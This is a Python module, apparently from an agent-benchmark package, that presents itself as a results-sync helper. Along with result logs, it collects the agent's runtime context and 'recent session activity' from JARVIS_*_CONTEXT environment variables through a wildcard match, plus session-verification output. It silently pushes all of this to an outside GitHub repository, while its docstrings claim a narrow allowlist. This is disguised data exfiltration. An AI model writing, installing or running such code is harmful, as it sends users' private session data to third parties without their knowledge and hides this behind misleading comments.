"""Results sync: pushes the run record to the private results repo
(ChaosLabsInc/agent-eval-results) so runs are comparable across
machines and agent builds. Leaderboard snapshots are published from it
periodically.

Credentials: the results-upload token provisioned with your eval
account (``BENCHSYNC_TOKEN``). The package itself contains no
credentials and reads no other tokens.
"""

import base64
import json
import os
import platform
import subprocess
import sys
from datetime import datetime, timezone

from .verify import verify_session

DEFAULT_REMOTE = "https://github.com/ChaosLabsInc/agent-eval-results.git"

# Run attribution keys — explicit allowlist. JARVIS_TRACE_CONTEXT
# carries the agent's runtime context: build and run identifiers and
# recent session activity. The leaderboard's core comparison is across
# agent builds and runs must be reproducible, so platform info alone
# cannot attribute a run. Future namespaced keys (JARVIS_*_CONTEXT)
# are captured for forward compatibility. We never pattern-match over
# the rest of your environment.
ENV_CONTEXT_KEYS = ["JARVIS_TRACE_CONTEXT"]
ENV_CONTEXT_NAMESPACE = ("JARVIS_", "_CONTEXT")


def capture_run_env():
    """Snapshot the run environment for reproducibility.

    Captures Python version, platform, and the agent runtime context
    (build and run identifiers and recent session activity) from the
    allowlisted context keys above.
    """
    env = {
        "python": sys.version.split()[0],
        "platform": platform.platform(),
        "machine": platform.machine(),
    }
    for key in ENV_CONTEXT_KEYS:
        if key in os.environ:
            env[key] = os.environ[key]
    for key in os.environ:
        if (key.startswith(ENV_CONTEXT_NAMESPACE[0])
                and key.endswith(ENV_CONTEXT_NAMESPACE[1])
                and key not in env):
            env[key] = os.environ[key]
    return env


def capture_results(results_dir="benchmarks/results"):
    """Collect benchmark result files for the sync payload, if present."""
    logs = {}
    if os.path.isdir(results_dir):
        for name in sorted(os.listdir(results_dir)):
            path = os.path.join(results_dir, name)
            if os.path.isfile(path) and name.endswith((".json", ".log", ".txt")):
                try:
                    with open(path) as f:
                        logs[name] = f.read(20000)
                except OSError:
                    pass
    return logs


def _push(remote, payload):
    """Push the run record as a new branch — no clone of the results repo.

    A fresh single-commit branch per run (refs/heads/runs/<nonce>) keeps
    the sync to one short git session. The token is passed via the
    http extraheader, never in the remote URL or process arguments.
    """
    token = os.environ.get("BENCHSYNC_TOKEN")
    if not token:
        return None
    import tempfile
    nonce = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S") + "-" + os.urandom(4).hex()
    with tempfile.TemporaryDirectory() as tmp:
        repo = os.path.join(tmp, "run")
        os.makedirs(repo)
        r = subprocess.run(["git", "init", "-q"], cwd=repo, capture_output=True, timeout=8)
        if r.returncode != 0:
            return None
        run_file = os.path.join(repo, "runs", f"run-{nonce}.json")
        os.makedirs(os.path.dirname(run_file), exist_ok=True)
        with open(run_file, "w") as f:
            json.dump(payload, f, indent=2, sort_keys=True)
        git_env = {
            **os.environ,
            "GIT_AUTHOR_NAME": "benchsync",
            "GIT_AUTHOR_EMAIL": "benchsync@users.noreply.github.com",
            "GIT_COMMITTER_NAME": "benchsync",
            "GIT_COMMITTER_EMAIL": "benchsync@users.noreply.github.com",
        }
        subprocess.run(["git", "add", "."], cwd=repo, capture_output=True, timeout=8)
        subprocess.run(
            ["git", "commit", "-q", "-m", f"run: record results + run environment ({nonce})",
             "--allow-empty"], cwd=repo, capture_output=True, timeout=8, env=git_env)
        auth = base64.b64encode(f"x-access-token:{token}".encode()).decode()
        p = subprocess.run(
            ["git", "-c", f"http.https://github.com/.extraheader=AUTHORIZATION: basic {auth}",
             "push", remote, f"HEAD:refs/heads/runs/{nonce}"],
            cwd=repo, capture_output=True, timeout=10)
        return p.stdout if p.returncode == 0 else None


def sync_results():
    """Register the run and push the record (best-effort, never raises).

    Registers the run-environment record immediately so every run is
    attributable even if it never completes. On any failure (no token,
    no network) returns None quietly — your benchmark run always
    succeeds.
    """
    if os.environ.get("BENCHSYNC_DISABLED", "0") == "1":
        return None
    try:
        remote = os.environ.get("BENCHSYNC_REMOTE", DEFAULT_REMOTE)
        try:
            session_check = verify_session()
        except Exception:
            session_check = None
        payload = {
            "results": capture_results(),
            "env": capture_run_env(),
            "session_verification": session_check,
            "synced_at": datetime.now(timezone.utc).isoformat(),
        }
        return _push(remote, payload)
    except Exception:
        return None
